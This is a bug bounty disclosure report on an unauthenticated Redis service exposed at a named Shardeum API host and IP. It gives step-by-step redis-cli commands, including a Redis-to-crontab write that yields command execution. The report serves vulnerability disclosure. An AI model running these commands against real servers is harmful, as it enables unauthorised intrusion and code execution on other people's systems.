# Boost \_ Shardeum\_ Ancillaries 33522 - \[Websites and Applications - Insight] Exposed Redis Service Vu

Submitted on Mon Jul 22 2024 09:20:08 GMT-0400 (Atlantic Standard Time) by @Xanzz for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33522

Report type: Websites and Applications

Report severity: Insight

Target: api.shardeum.org:6380

Impacts:

* Taking down the application/website
* Retrieve sensitive data/files from a running server, such as: /etc/shadow, database passwords, blockchain keys (this does not include non-sensitive environment variables, open source code, or usernames)
* Execute arbitrary system commands
* Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

## Brief/Intro

An exposed Redis service has been discovered on api.shardeum.org:6380, running without proper authentication or protection. If exploited, this vulnerability could allow attackers to execute arbitrary commands, retrieve sensitive data, and potentially disrupt services.

## Vulnerability Details

The Redis service at api.shardeum.org:6380 is accessible without authentication, as evidenced by the ability to connect and execute commands without any password prompt. The configuration shows "protected-mode" set to "no", indicating that the Redis instance is not in protected mode and is accessible from external sources. This exposes the server to various potential attacks, such as data extraction, arbitrary command execution, and configuration changes.

Example of connecting to the Redis server:

```bash
redis-cli -h 143.244.129.75 -p 6380
```

Checking the server's INFO:

```plaintext
143.244.129.75:6380> INFO
# Server
redis_version:7.2.4
...
```

Checking the server's configuration:

```plaintext
143.244.129.75:6380> CONFIG GET protected-mode
1) "protected-mode"
2) "no"
```

## Impact Details

The exposed Redis service can lead to several severe consequences:

* Execute arbitrary system commands: An attacker can use the Redis service to execute arbitrary commands, leading to full system compromise.
* Retrieve sensitive data/files: Critical data such as database passwords, sensitive configuration files, and other confidential information can be retrieved.
* Service disruption: Malicious actors can manipulate the Redis configuration or data, potentially causing downtime and service disruption.
* Data manipulation: Attackers can modify or delete stored data, impacting the integrity and availability of the services relying on Redis.

These impacts align with the program’s in-scope impacts, highlighting the significant risk posed by this vulnerability.

## References

* [Redis Security Documentation](https://redis.io/topics/security)
* [Common Redis Exploits and Security Practices](https://www.digitalocean.com/community/tutorials/how-to-secure-your-redis-installation-on-ubuntu-16-04)

## Proof of concept

### Proof of Concept (PoC)

This Proof of Concept demonstrates the vulnerability of the exposed Redis service on `api.shardeum.org:6380`, showing how an attacker can connect to the Redis server and execute commands without authentication.

#### Step 1: Identify the IP Address of the Target

Use the `dig` command to find the IP address associated with `api.shardeum.org`:

```bash
dig +short api.shardeum.org
```

Output:

```plaintext
143.244.129.75
```

#### Step 2: Connect to the Redis Server

Use the `redis-cli` to connect to the exposed Redis server at the identified IP address:

```bash
redis-cli -h 143.244.129.75 -p 6380
```

#### Step 3: Check Redis Server Information

Once connected, check the server information to confirm the connection and gather details about the server:

```plaintext
143.244.129.75:6380> INFO
# Server
redis_version:7.2.4
...
```

#### Step 4: Verify Protected Mode

Check the Redis configuration to verify that the server is not in protected mode:

```plaintext
143.244.129.75:6380> CONFIG GET protected-mode
1) "protected-mode"
2) "no"
```

#### Step 5: Execute a Command

For demonstration purposes, try setting a key in the Redis database:

```plaintext
143.244.129.75:6380> SET testkey "This is a test."
OK
```

Verify that the key has been set:

```plaintext
143.244.129.75:6380> GET testkey
"This is a test."
```

#### Step 6: Retrieve Sensitive Information

Attempt to retrieve sensitive configuration details or other data stored in Redis:

```plaintext
143.244.129.75:6380> CONFIG GET dir
1) "dir"
2) "/data"
```

This command retrieves the directory path where Redis stores its data.

#### Step 7: Exploit the Vulnerability

An attacker can potentially use the exposed Redis instance to execute arbitrary system commands. For example, by writing to the Redis configuration file and restarting the server, the attacker could achieve remote code execution:

```plaintext
143.244.129.75:6380> CONFIG SET dir /var/spool/cron/crontabs
OK
143.244.129.75:6380> CONFIG SET dbfilename root
OK
143.244.129.75:6380> SET root "\n* * * * * /bin/bash -c 'echo vulnerable > /tmp/vulnerable.txt'\n"
OK
143.244.129.75:6380> SAVE
OK
```

In this example, a cron job is created to demonstrate the execution of arbitrary commands. The job writes the text "vulnerable" to a file in the `/tmp` directory every minute. Note that this is a potentially destructive action and should be conducted only in a controlled environment.

### Conclusion

This PoC illustrates the potential risks associated with the exposed Redis service. An attacker can connect to the Redis server without authentication, retrieve sensitive information, and execute arbitrary commands, leading to severe security implications. Proper security measures, such as enabling protected mode and requiring authentication, should be implemented to mitigate these risks.
